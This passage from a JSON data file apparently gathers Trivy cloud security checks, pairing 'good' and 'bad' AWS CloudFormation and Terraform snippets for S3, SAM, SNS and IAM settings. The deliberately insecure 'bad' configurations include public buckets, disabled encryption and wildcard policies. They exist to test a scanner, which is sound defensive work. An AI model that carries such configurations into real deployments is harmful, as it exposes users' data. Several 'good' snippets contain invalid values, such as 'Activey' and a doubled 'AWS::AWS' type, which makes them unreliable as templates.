              "resource \"aws_s3_bucket\" \"good_example\" {\n  acl = \"private\"\n}",
              "resource \"aws_s3_bucket\" \"good_example\" {\n  bucket = \"yournamehere\"\n}\n\nresource \"aws_s3_bucket_acl\" \"example\" {\n  bucket = aws_s3_bucket.good_example.id\n  acl    = \"private\"\n}"
            ],
            "bad": [
              "resource \"aws_s3_bucket\" \"bad_example\" {\n  acl = \"public-read\"\n}",
              "resource \"aws_s3_bucket\" \"bad_example\" {\n  bucket = \"yournamehere\"\n}\n\nresource \"aws_s3_bucket_acl\" \"example\" {\n  bucket = aws_s3_bucket.bad_example.id\n  acl    = \"authenticated-read\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-S3-NO_PUBLIC_BUCKETS",
        "title": "No Public Buckets",
        "provider": "aws",
        "service": "s3",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::S3::Bucket\n          Properties:\n            PublicAccessBlockConfiguration:\n              RestrictPublicBuckets: true\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::S3::Bucket\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_public_access_block#restrict_public_buckets\u00a1\n  good:\n    - |-\n      resource \"aws_s3_bucket\" \"good_example\" {\n        bucket = \"bucket\"\n      }\n\n      resource \"aws_s3_bucket_public_access_block\" \"example\" {\n        bucket = aws_s3_bucket.good_example.id\n\n        restrict_public_buckets = true\n      }\n  bad:\n    - |-\n      resource \"aws_s3_bucket\" \"bad_example\" {\n        bucket = \"bucket\"\n      }\n\n      resource \"aws_s3_bucket_public_access_block\" \"example\" {\n        bucket = aws_s3_bucket.bad_example.id\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"bad_example\" {\n        bucket = \"bucket\"\n      }\n\n      resource \"aws_s3_bucket_public_access_block\" \"example\" {\n        bucket = aws_s3_bucket.bad_example.id\n\n        restrict_public_buckets = false\n      }\n",
        "file_name": "no_public_buckets.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/s3/no_public_buckets.yaml",
        "local_path": "aws/s3/no_public_buckets.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::S3::Bucket\n    Properties:\n      PublicAccessBlockConfiguration:\n        RestrictPublicBuckets: true"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::S3::Bucket"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_public_access_block#restrict_public_buckets\u00a1"
            ],
            "good": [
              "resource \"aws_s3_bucket\" \"good_example\" {\n  bucket = \"bucket\"\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"example\" {\n  bucket = aws_s3_bucket.good_example.id\n\n  restrict_public_buckets = true\n}"
            ],
            "bad": [
              "resource \"aws_s3_bucket\" \"bad_example\" {\n  bucket = \"bucket\"\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"example\" {\n  bucket = aws_s3_bucket.bad_example.id\n}",
              "resource \"aws_s3_bucket\" \"bad_example\" {\n  bucket = \"bucket\"\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"example\" {\n  bucket = aws_s3_bucket.bad_example.id\n\n  restrict_public_buckets = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-S3-REQUIRE_MFA_DELETE",
        "title": "Require Mfa Delete",
        "provider": "aws",
        "service": "s3",
        "language": "cloudformation",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_versioning\n  good:\n    - |-\n      resource \"aws_s3_bucket\" \"example\" {\n        bucket = \"bucket\"\n      }\n\n      resource \"aws_s3_bucket_versioning\" \"good_example\" {\n        bucket = aws_s3_bucket.example.id\n\n        versioning_configuration {\n          status     = \"Enabled\"\n          mfa_delete = \"Enabled\"\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_s3_bucket\" \"example\" {\n        bucket = \"bucket\"\n      }\n\n      resource \"aws_s3_bucket_versioning\" \"good_example\" {\n        bucket = aws_s3_bucket.example.id\n\n        versioning_configuration {\n          status     = \"Enabled\"\n          mfa_delete = \"Disabled\"\n        }\n      }\n",
        "file_name": "require_mfa_delete.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/s3/require_mfa_delete.yaml",
        "local_path": "aws/s3/require_mfa_delete.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_versioning"
            ],
            "good": [
              "resource \"aws_s3_bucket\" \"example\" {\n  bucket = \"bucket\"\n}\n\nresource \"aws_s3_bucket_versioning\" \"good_example\" {\n  bucket = aws_s3_bucket.example.id\n\n  versioning_configuration {\n    status     = \"Enabled\"\n    mfa_delete = \"Enabled\"\n  }\n}"
            ],
            "bad": [
              "resource \"aws_s3_bucket\" \"example\" {\n  bucket = \"bucket\"\n}\n\nresource \"aws_s3_bucket_versioning\" \"good_example\" {\n  bucket = aws_s3_bucket.example.id\n\n  versioning_configuration {\n    status     = \"Enabled\"\n    mfa_delete = \"Disabled\"\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-S3-SPECIFY_PUBLIC_ACCESS_BLOCK",
        "title": "Specify Public Access Block",
        "provider": "aws",
        "service": "s3",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::S3::Bucket\n          Properties:\n            AccessControl: Private\n            PublicAccessBlockConfiguration:\n              BlockPublicAcls: true\n              BlockPublicPolicy: true\n              IgnorePublicAcls: true\n              RestrictPublicBuckets: true\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::S3::Bucket\n          Properties:\n            AccessControl: AuthenticatedRead\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_public_access_block#bucket\n  good:\n    - |-\n      resource \"aws_s3_bucket\" \"example\" {\n        bucket = \"example\"\n        acl    = \"private-read\"\n      }\n\n      resource \"aws_s3_bucket_public_access_block\" \"example\" {\n        bucket              = aws_s3_bucket.example.id\n        block_public_acls   = true\n        block_public_policy = true\n      }\n  bad:\n    - |-\n      resource \"aws_s3_bucket\" \"example\" {\n        bucket = \"example\"\n        acl    = \"private-read\"\n      }\n",
        "file_name": "specify_public_access_block.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/s3/specify_public_access_block.yaml",
        "local_path": "aws/s3/specify_public_access_block.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::S3::Bucket\n    Properties:\n      AccessControl: Private\n      PublicAccessBlockConfiguration:\n        BlockPublicAcls: true\n        BlockPublicPolicy: true\n        IgnorePublicAcls: true\n        RestrictPublicBuckets: true"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::S3::Bucket\n    Properties:\n      AccessControl: AuthenticatedRead"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_public_access_block#bucket"
            ],
            "good": [
              "resource \"aws_s3_bucket\" \"example\" {\n  bucket = \"example\"\n  acl    = \"private-read\"\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"example\" {\n  bucket              = aws_s3_bucket.example.id\n  block_public_acls   = true\n  block_public_policy = true\n}"
            ],
            "bad": [
              "resource \"aws_s3_bucket\" \"example\" {\n  bucket = \"example\"\n  acl    = \"private-read\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-SAM-API_USE_SECURE_TLS_POLICY",
        "title": "Api Use Secure Tls Policy",
        "provider": "aws",
        "service": "sam",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Serverless::Api\n          Properties:\n            Domain:\n              SecurityPolicy: TLS_1_2\n            Name: Good SAM API example\n            StageName: Prod\n            TracingEnabled: false\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Serverless::Api\n          Properties:\n            Name: Bad SAM API example\n            StageName: Prod\n            TracingEnabled: false\n",
        "file_name": "api_use_secure_tls_policy.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/sam/api_use_secure_tls_policy.yaml",
        "local_path": "aws/sam/api_use_secure_tls_policy.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::Serverless::Api\n    Properties:\n      Domain:\n        SecurityPolicy: TLS_1_2\n      Name: Good SAM API example\n      StageName: Prod\n      TracingEnabled: false"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::Serverless::Api\n    Properties:\n      Name: Bad SAM API example\n      StageName: Prod\n      TracingEnabled: false"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-SAM-ENABLE_API_ACCESS_LOGGING",
        "title": "Enable Api Access Logging",
        "provider": "aws",
        "service": "sam",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Serverless::Api\n          Properties:\n            AccessLogSetting:\n              DestinationArn: gateway-logging\n              Format: json\n            Name: Good SAM API example\n            StageName: Prod\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Serverless::Api\n          Properties:\n            Name: Bad SAM API example\n            StageName: Prod\n",
        "file_name": "enable_api_access_logging.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/sam/enable_api_access_logging.yaml",
        "local_path": "aws/sam/enable_api_access_logging.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::Serverless::Api\n    Properties:\n      AccessLogSetting:\n        DestinationArn: gateway-logging\n        Format: json\n      Name: Good SAM API example\n      StageName: Prod"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::Serverless::Api\n    Properties:\n      Name: Bad SAM API example\n      StageName: Prod"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-SAM-ENABLE_API_CACHE_ENCRYPTION",
        "title": "Enable Api Cache Encryption",
        "provider": "aws",
        "service": "sam",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Serverless::Api\n          Properties:\n            MethodSettings:\n              CacheDataEncrypted: true\n            Name: Good SAM API example\n            StageName: Prod\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Serverless::Api\n          Properties:\n            Name: Bad SAM API example\n            StageName: Prod\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Serverless::Api\n          Properties:\n            MethodSettings:\n              CacheDataEncrypted: false\n            Name: Bad SAM API example\n            StageName: Prod\n",
        "file_name": "enable_api_cache_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/sam/enable_api_cache_encryption.yaml",
        "local_path": "aws/sam/enable_api_cache_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::Serverless::Api\n    Properties:\n      MethodSettings:\n        CacheDataEncrypted: true\n      Name: Good SAM API example\n      StageName: Prod"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::Serverless::Api\n    Properties:\n      Name: Bad SAM API example\n      StageName: Prod",
              "Resources:\n  BadExample:\n    Type: AWS::Serverless::Api\n    Properties:\n      MethodSettings:\n        CacheDataEncrypted: false\n      Name: Bad SAM API example\n      StageName: Prod"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-SAM-ENABLE_API_TRACING",
        "title": "Enable Api Tracing",
        "provider": "aws",
        "service": "sam",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Serverless::Api\n          Properties:\n            Name: Good SAM API example\n            StageName: Prod\n            TracingEnabled: true\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Serverless::Api\n          Properties:\n            Name: Bad SAM API example\n            StageName: Prod\n            TracingEnabled: false\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Serverless::Api\n          Properties:\n            Name: Bad SAM API example\n            StageName: Prod\n",
        "file_name": "enable_api_tracing.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/sam/enable_api_tracing.yaml",
        "local_path": "aws/sam/enable_api_tracing.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::Serverless::Api\n    Properties:\n      Name: Good SAM API example\n      StageName: Prod\n      TracingEnabled: true"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::Serverless::Api\n    Properties:\n      Name: Bad SAM API example\n      StageName: Prod\n      TracingEnabled: false",
              "Resources:\n  BadExample:\n    Type: AWS::Serverless::Api\n    Properties:\n      Name: Bad SAM API example\n      StageName: Prod"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-SAM-ENABLE_FUNCTION_TRACING",
        "title": "Enable Function Tracing",
        "provider": "aws",
        "service": "sam",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodFunction:\n          Type: AWS::Serverless::Function\n          Properties:\n            ImageConfig:\n              Command:\n                - app.lambda_handler\n              EntryPoint:\n                - entrypoint1\n              WorkingDirectory: workDir\n            ImageUri: account-id.dkr.ecr.region.amazonaws.com/ecr-repo-name:image-name\n            PackageType: Image\n            Tracing: Active\n  bad:\n    - |-\n      Resources:\n        BadFunction:\n          Type: AWS::Serverless::Function\n          Properties:\n            ImageConfig:\n              Command:\n                - app.lambda_handler\n              EntryPoint:\n                - entrypoint1\n              WorkingDirectory: workDir\n            ImageUri: account-id.dkr.ecr.region.amazonaws.com/ecr-repo-name:image-name\n            PackageType: Image\n",
        "file_name": "enable_function_tracing.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/sam/enable_function_tracing.yaml",
        "local_path": "aws/sam/enable_function_tracing.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodFunction:\n    Type: AWS::Serverless::Function\n    Properties:\n      ImageConfig:\n        Command:\n          - app.lambda_handler\n        EntryPoint:\n          - entrypoint1\n        WorkingDirectory: workDir\n      ImageUri: account-id.dkr.ecr.region.amazonaws.com/ecr-repo-name:image-name\n      PackageType: Image\n      Tracing: Active"
            ],
            "bad": [
              "Resources:\n  BadFunction:\n    Type: AWS::Serverless::Function\n    Properties:\n      ImageConfig:\n        Command:\n          - app.lambda_handler\n        EntryPoint:\n          - entrypoint1\n        WorkingDirectory: workDir\n      ImageUri: account-id.dkr.ecr.region.amazonaws.com/ecr-repo-name:image-name\n      PackageType: Image"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-SAM-ENABLE_HTTP_API_ACCESS_LOGGING",
        "title": "Enable Http Api Access Logging",
        "provider": "aws",
        "service": "sam",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Serverless::HttpApi\n          Properties:\n            AccessLogSettings:\n              DestinationArn: gateway-logging\n              Format: json\n            Name: Good SAM API example\n            StageName: Prod\n            Tracing: Activey\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Serverless::HttpApi\n          Properties:\n            Name: Good SAM API example\n            StageName: Prod\n            Tracing: Passthrough\n",
        "file_name": "enable_http_api_access_logging.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/sam/enable_http_api_access_logging.yaml",
        "local_path": "aws/sam/enable_http_api_access_logging.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::Serverless::HttpApi\n    Properties:\n      AccessLogSettings:\n        DestinationArn: gateway-logging\n        Format: json\n      Name: Good SAM API example\n      StageName: Prod\n      Tracing: Activey"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::Serverless::HttpApi\n    Properties:\n      Name: Good SAM API example\n      StageName: Prod\n      Tracing: Passthrough"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-SAM-ENABLE_STATE_MACHINE_LOGGING",
        "title": "Enable State Machine Logging",
        "provider": "aws",
        "service": "sam",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::AWS::Serverless::StateMachine\n          Properties:\n            Logging:\n              Level: ALL\n              Destinations:\n                - CloudWatchLogsLogGroup:\n                    LogGroupArn: arn:aws:logs:us-east-1:123456789012:log-group:/aws/states/my-logs:*\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Serverless::StateMachine\n",
        "file_name": "enable_state_machine_logging.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/sam/enable_state_machine_logging.yaml",
        "local_path": "aws/sam/enable_state_machine_logging.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::AWS::Serverless::StateMachine\n    Properties:\n      Logging:\n        Level: ALL\n        Destinations:\n          - CloudWatchLogsLogGroup:\n              LogGroupArn: arn:aws:logs:us-east-1:123456789012:log-group:/aws/states/my-logs:*"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::Serverless::StateMachine"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-SAM-ENABLE_STATE_MACHINE_TRACING",
        "title": "Enable State Machine Tracing",
        "provider": "aws",
        "service": "sam",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodStateMachine:\n          Type: AWS::Serverless::StateMachine\n          Properties:\n            Definition:\n              StartAt: MyLambdaState\n              States:\n                MyLambdaState:\n                  End: true\n                  Resource: arn:aws:lambda:us-east-1:123456123456:function:my-sample-lambda-app\n                  Type: Task\n            Role: arn:aws:iam::123456123456:role/service-role/my-sample-role\n            Tracing:\n              Enabled: true\n  bad:\n    - |-\n      Resources:\n        BadStateMachine:\n          Type: AWS::Serverless::StateMachine\n          Properties:\n            Definition:\n              StartAt: MyLambdaState\n              States:\n                MyLambdaState:\n                  End: true\n                  Resource: arn:aws:lambda:us-east-1:123456123456:function:my-sample-lambda-app\n                  Type: Task\n            Role: arn:aws:iam::123456123456:role/service-role/my-sample-role\n            Tracing:\n              Enabled: false\n    - |-\n      Resources:\n        BadStateMachine:\n          Type: AWS::Serverless::StateMachine\n          Properties:\n            Definition:\n              StartAt: MyLambdaState\n              States:\n                MyLambdaState:\n                  End: true\n                  Resource: arn:aws:lambda:us-east-1:123456123456:function:my-sample-lambda-app\n                  Type: Task\n            Role: arn:aws:iam::123456123456:role/service-role/my-sample-role\n",
        "file_name": "enable_state_machine_tracing.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/sam/enable_state_machine_tracing.yaml",
        "local_path": "aws/sam/enable_state_machine_tracing.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodStateMachine:\n    Type: AWS::Serverless::StateMachine\n    Properties:\n      Definition:\n        StartAt: MyLambdaState\n        States:\n          MyLambdaState:\n            End: true\n            Resource: arn:aws:lambda:us-east-1:123456123456:function:my-sample-lambda-app\n            Type: Task\n      Role: arn:aws:iam::123456123456:role/service-role/my-sample-role\n      Tracing:\n        Enabled: true"
            ],
            "bad": [
              "Resources:\n  BadStateMachine:\n    Type: AWS::Serverless::StateMachine\n    Properties:\n      Definition:\n        StartAt: MyLambdaState\n        States:\n          MyLambdaState:\n            End: true\n            Resource: arn:aws:lambda:us-east-1:123456123456:function:my-sample-lambda-app\n            Type: Task\n      Role: arn:aws:iam::123456123456:role/service-role/my-sample-role\n      Tracing:\n        Enabled: false",
              "Resources:\n  BadStateMachine:\n    Type: AWS::Serverless::StateMachine\n    Properties:\n      Definition:\n        StartAt: MyLambdaState\n        States:\n          MyLambdaState:\n            End: true\n            Resource: arn:aws:lambda:us-east-1:123456123456:function:my-sample-lambda-app\n            Type: Task\n      Role: arn:aws:iam::123456123456:role/service-role/my-sample-role"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-SAM-ENABLE_TABLE_ENCRYPTION",
        "title": "Enable Table Encryption",
        "provider": "aws",
        "service": "sam",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodFunction:\n          Type: AWS::Serverless::SimpleTable\n          Properties:\n            SSESpecification:\n              SSEEnabled: true\n            TableName: GoodTable\n  bad:\n    - |-\n      Resources:\n        BadFunction:\n          Type: AWS::Serverless::SimpleTable\n          Properties:\n            SSESpecification:\n              SSEEnabled: false\n            TableName: Bad Table\n    - |-\n      Resources:\n        BadFunction:\n          Type: AWS::Serverless::SimpleTable\n          Properties:\n            TableName: Bad Table\n",
        "file_name": "enable_table_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/sam/enable_table_encryption.yaml",
        "local_path": "aws/sam/enable_table_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodFunction:\n    Type: AWS::Serverless::SimpleTable\n    Properties:\n      SSESpecification:\n        SSEEnabled: true\n      TableName: GoodTable"
            ],
            "bad": [
              "Resources:\n  BadFunction:\n    Type: AWS::Serverless::SimpleTable\n    Properties:\n      SSESpecification:\n        SSEEnabled: false\n      TableName: Bad Table",
              "Resources:\n  BadFunction:\n    Type: AWS::Serverless::SimpleTable\n    Properties:\n      TableName: Bad Table"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-SAM-NO_FUNCTION_POLICY_WILDCARDS",
        "title": "No Function Policy Wildcards",
        "provider": "aws",
        "service": "sam",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodFunction:\n          Type: AWS::Serverless::Function\n          Properties:\n            PackageType: Image\n            ImageUri: account-id.dkr.ecr.region.amazonaws.com/ecr-repo-name:image-name\n            ImageConfig:\n              Command:\n                - app.lambda_handler\n              EntryPoint:\n                - entrypoint1\n              WorkingDirectory: workDir\n            Policies:\n              - AWSLambdaExecute\n              - Version: \"2012-10-17\"\n                Statement:\n                  - Effect: Allow\n                    Action:\n                      - s3:GetObject\n                      - s3:GetObjectACL\n                    Resource: arn:aws:s3:::my-bucket/*\n  bad:\n    - |-\n      Resources:\n        BadFunction:\n          Type: AWS::Serverless::Function\n          Properties:\n            PackageType: Image\n            ImageUri: account-id.dkr.ecr.region.amazonaws.com/ecr-repo-name:image-name\n            ImageConfig:\n              Command:\n                - app.lambda_handler\n              EntryPoint:\n                - entrypoint1\n              WorkingDirectory: workDir\n            Policies:\n              - AWSLambdaExecute\n              - Version: \"2012-10-17\"\n                Statement:\n                  - Effect: Allow\n                    Action:\n                      - s3:*\n                    Resource: arn:aws:s3:::my-bucket/*\n",
        "file_name": "no_function_policy_wildcards.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/sam/no_function_policy_wildcards.yaml",
        "local_path": "aws/sam/no_function_policy_wildcards.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodFunction:\n    Type: AWS::Serverless::Function\n    Properties:\n      PackageType: Image\n      ImageUri: account-id.dkr.ecr.region.amazonaws.com/ecr-repo-name:image-name\n      ImageConfig:\n        Command:\n          - app.lambda_handler\n        EntryPoint:\n          - entrypoint1\n        WorkingDirectory: workDir\n      Policies:\n        - AWSLambdaExecute\n        - Version: \"2012-10-17\"\n          Statement:\n            - Effect: Allow\n              Action:\n                - s3:GetObject\n                - s3:GetObjectACL\n              Resource: arn:aws:s3:::my-bucket/*"
            ],
            "bad": [
              "Resources:\n  BadFunction:\n    Type: AWS::Serverless::Function\n    Properties:\n      PackageType: Image\n      ImageUri: account-id.dkr.ecr.region.amazonaws.com/ecr-repo-name:image-name\n      ImageConfig:\n        Command:\n          - app.lambda_handler\n        EntryPoint:\n          - entrypoint1\n        WorkingDirectory: workDir\n      Policies:\n        - AWSLambdaExecute\n        - Version: \"2012-10-17\"\n          Statement:\n            - Effect: Allow\n              Action:\n                - s3:*\n              Resource: arn:aws:s3:::my-bucket/*"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-SAM-NO_STATE_MACHINE_POLICY_WILDCARDS",
        "title": "No State Machine Policy Wildcards",
        "provider": "aws",
        "service": "sam",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodFunction:\n          Type: AWS::Serverless::StateMachine\n          Properties:\n            Definition:\n              StartAt: MyLambdaState\n              States:\n                MyLambdaState:\n                  Type: Task\n                  Resource: arn:aws:lambda:us-east-1:123456123456:function:my-sample-lambda-app\n                  End: true\n            Role: arn:aws:iam::123456123456:role/service-role/my-sample-role\n            Tracing:\n              Enabled: true\n            Policies:\n              - AWSLambdaExecute\n              - Version: \"2012-10-17\"\n                Statement:\n                  - Effect: Allow\n                    Action:\n                      - s3:GetObject\n                      - s3:GetObjectACL\n                    Resource: arn:aws:s3:::my-bucket/*\n  bad:\n    - |-\n      Resources:\n        BadFunction:\n          Type: AWS::Serverless::StateMachine\n          Properties:\n            Definition:\n              StartAt: MyLambdaState\n              States:\n                MyLambdaState:\n                  Type: Task\n                  Resource: arn:aws:lambda:us-east-1:123456123456:function:my-sample-lambda-app\n                  End: true\n            Role: arn:aws:iam::123456123456:role/service-role/my-sample-role\n            Tracing:\n              Enabled: true\n            Policies:\n              - AWSLambdaExecute\n              - Version: \"2012-10-17\"\n                Statement:\n                  - Effect: Allow\n                    Action:\n                      - s3:*\n                    Resource: arn:aws:s3:::my-bucket/*\n",
        "file_name": "no_state_machine_policy_wildcards.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/sam/no_state_machine_policy_wildcards.yaml",
        "local_path": "aws/sam/no_state_machine_policy_wildcards.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodFunction:\n    Type: AWS::Serverless::StateMachine\n    Properties:\n      Definition:\n        StartAt: MyLambdaState\n        States:\n          MyLambdaState:\n            Type: Task\n            Resource: arn:aws:lambda:us-east-1:123456123456:function:my-sample-lambda-app\n            End: true\n      Role: arn:aws:iam::123456123456:role/service-role/my-sample-role\n      Tracing:\n        Enabled: true\n      Policies:\n        - AWSLambdaExecute\n        - Version: \"2012-10-17\"\n          Statement:\n            - Effect: Allow\n              Action:\n                - s3:GetObject\n                - s3:GetObjectACL\n              Resource: arn:aws:s3:::my-bucket/*"
            ],
            "bad": [
              "Resources:\n  BadFunction:\n    Type: AWS::Serverless::StateMachine\n    Properties:\n      Definition:\n        StartAt: MyLambdaState\n        States:\n          MyLambdaState:\n            Type: Task\n            Resource: arn:aws:lambda:us-east-1:123456123456:function:my-sample-lambda-app\n            End: true\n      Role: arn:aws:iam::123456123456:role/service-role/my-sample-role\n      Tracing:\n        Enabled: true\n      Policies:\n        - AWSLambdaExecute\n        - Version: \"2012-10-17\"\n          Statement:\n            - Effect: Allow\n              Action:\n                - s3:*\n              Resource: arn:aws:s3:::my-bucket/*"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-SNS-ENABLE_TOPIC_ENCRYPTION",
        "title": "Enable Topic Encryption",
        "provider": "aws",
        "service": "sns",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodTopic:\n          Type: AWS::SNS::Topic\n          Properties:\n            KmsMasterKeyId: some-key\n            TopicName: blah\n  bad:\n    - |-\n      Resources:\n        BadTopic:\n          Type: AWS::SNS::Topic\n          Properties:\n            TopicName: blah\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sns_topic#example-with-server-side-encryption-sse\n  good:\n    - |-\n      resource \"aws_sns_topic\" \"good_example\" {\n        kms_master_key_id = \"/blah\"\n      }\n    - |-\n      resource \"aws_sns_topic\" \"good_example\" {\n        kms_master_key_id = \"alias/aws/sns\"\n      }\n  bad:\n    - |-\n      resource \"aws_sns_topic\" \"bad_example\" {}\n",
        "file_name": "enable_topic_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/sns/enable_topic_encryption.yaml",
        "local_path": "aws/sns/enable_topic_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodTopic:\n    Type: AWS::SNS::Topic\n    Properties:\n      KmsMasterKeyId: some-key\n      TopicName: blah"
            ],
            "bad": [
              "Resources:\n  BadTopic:\n    Type: AWS::SNS::Topic\n    Properties:\n      TopicName: blah"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sns_topic#example-with-server-side-encryption-sse"
            ],
            "good": [
              "resource \"aws_sns_topic\" \"good_example\" {\n  kms_master_key_id = \"/blah\"\n}",
              "resource \"aws_sns_topic\" \"good_example\" {\n  kms_master_key_id = \"alias/aws/sns\"\n}"
            ],
            "bad": [
              "resource \"aws_sns_topic\" \"bad_example\" {}"
            ]
          }
        }
      },
      {
